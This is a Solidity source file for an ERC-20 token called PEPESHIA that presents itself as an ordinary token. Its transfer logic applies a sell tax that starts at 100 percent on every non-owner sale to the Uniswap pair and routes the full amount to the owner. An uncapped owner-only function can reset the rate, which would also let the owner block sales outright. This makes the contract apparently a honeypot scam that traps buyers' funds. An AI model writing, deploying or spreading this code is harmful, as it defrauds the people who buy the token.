// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PEPESHIA is IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string public name;
    string public symbol;
    uint8 public decimals;

    address public owner;
    uint256 public sellTaxRate = 100;
    address public uniSwapPair;
    address public taxDestination;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    constructor() {
        name = "PEPESHIA";
        symbol = "PEPESHIA";
        decimals = 18;
        _totalSupply = 10000000000 * (10 ** uint256(decimals));
        _balances[msg.sender] = _totalSupply;
        owner = msg.sender;
        taxDestination = owner;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 effectiveAmount = amount;
        if (recipient == uniSwapPair && sender != owner) { 
            uint256 taxAmount = (amount * sellTaxRate) / 100;
            effectiveAmount = amount - taxAmount;
            _balances[taxDestination] += taxAmount;
            emit Transfer(sender, taxDestination, taxAmount);
        }
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        _balances[sender] -= amount;
        _balances[recipient] += effectiveAmount;
        emit Transfer(sender, recipient, effectiveAmount);
    }

    function _approve(address _owner, address spender, uint256 amount) internal {
        require(_owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function updateSellTaxRate(uint256 newRate) external onlyOwner {
        sellTaxRate = newRate;
    }

    function setUniSwapPair(address _pair) external onlyOwner {
        uniSwapPair = _pair;
    }
}